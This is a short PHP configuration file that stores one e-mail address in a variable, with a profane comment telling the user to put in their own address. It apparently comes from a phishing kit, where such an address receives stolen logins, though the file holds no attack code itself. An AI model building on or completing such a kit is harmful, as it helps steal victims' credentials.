<?php

$email = "oluwadarasimi0147@outlook.com"; // PUT UR FUCKING E-MAIL BRO

?>